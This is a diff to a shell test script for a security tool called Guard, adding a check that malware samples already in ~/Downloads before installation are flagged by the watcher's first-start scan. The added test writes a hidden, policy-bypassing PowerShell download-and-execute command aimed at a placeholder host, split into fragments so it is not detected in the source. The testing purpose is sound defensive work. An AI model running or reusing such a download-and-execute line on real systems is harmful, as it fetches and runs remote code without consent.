@@ -8,8 +8,9 @@
 #      local web server so it downloads this build instead of the latest release.
 #
 # For each: the service runs, the watcher alerts on a malicious file dropped in
-# ~/Downloads, a reinstall over the running service works, and uninstall removes
-# the service.
+# ~/Downloads, malware already in ~/Downloads before the install is found by
+# the first-start scan, a reinstall over the running service works, and
+# uninstall removes the service.
 #
 #   check-unix.sh <path to guard binary>
 set -euo pipefail
@@ -63,6 +64,31 @@ check_watcher() {
     echo "watcher alerted on $name"
     rm -f "$f"
 }
+# A downloader script: not a type the watcher's supply-chain checks read, so
+# only the antivirus engine catches it. Split like the loader above.
+drop_downloader() {
+    printf '%s\n' "powershell -WindowStyle Hid""den -ExecutionPolicy By""pass -c \"IEX (New-Object Net.WebClient).Download""String('http://example.invalid/a')\"" > "$1"
+}
+
+# An already-infected machine: malware in ~/Downloads before Guard is
+# installed is found by the watcher's first-start scan.
+PRE="guard-preinstalled-$RANDOM$RANDOM"
+plant_preinstalled() {
+    drop_payload "$HOME/Downloads/$PRE.js"
+    drop_downloader "$HOME/Downloads/$PRE.ps1"
+}
+check_preinstalled() {   # <sudo or ""> <guard home>
+    local as=$1 home=$2 f
+    for f in "$PRE.js" "$PRE.ps1"; do
+        if ! wait_for_alert "$as" "$home" "$f"; then
+            $as tail -n 50 "$home/watcher.log" || true
+            fail "the first-start scan raised no alert for $HOME/Downloads/$f, there before the install"
+        fi
+        echo "first-start scan alerted on $f"
+    done
+    wait_for 300 "the initial scan to finish ($home/watcher.log)" \
+        $as grep -q "initial scan complete" "$home/watcher.log"
+}
 wait_for_alert() {
     for _ in $(seq 120); do
         $1 grep -q "$3" "$2/alerts.jsonl" 2>/dev/null && return 0
@@ -105,6 +131,7 @@ if [ "$OS" = Linux ]; then
 fi
 
 step "install.sh"
+plant_preinstalled
 GUARD_BIN="$BIN" "$SRC/install.sh"
 end
 step "install.sh: check the install"
@@ -113,6 +140,7 @@ step "install.sh: check the install"
 [ "$(git config --global --get core.hooksPath)" = "$HOME/.guard/githooks" ] \
     || fail "install.sh did not set the global git hooks"
 service_running user || { show_service user; fail "the watcher service is not running"; }
+check_preinstalled "" "$HOME/.guard"
 check_watcher "" "$HOME/.guard"
 end
 
@@ -168,6 +196,10 @@ if one_liner bad; then fail "guard.sh installed a binary with a wrong checksum";
 end
 
 step "guard.sh"
+# the root service on Linux starts from a fresh /var/lib/guard, so its first
+# start scans again; on macOS it reuses the ~/.guard install.sh left
+PRE="guard-preinstalled-$RANDOM$RANDOM"
+[ "$OS" = Linux ] && plant_preinstalled
 one_liner good
 end
 step "guard.sh: check the install"
@@ -178,6 +210,7 @@ if [ "$OS" = Linux ]; then
     sudo grep -q "$HOME/Downloads" $sys_home/watcher.config.json \
         || fail "the root service does not watch $HOME/Downloads"
     service_running system || { show_service system; fail "guard.service is not running"; }
+    check_preinstalled sudo $sys_home
     check_watcher sudo $sys_home
 else
     [ -f "/Library/LaunchAgents/$LABEL.plist" ] || fail "guard install wrote no LaunchAgent"
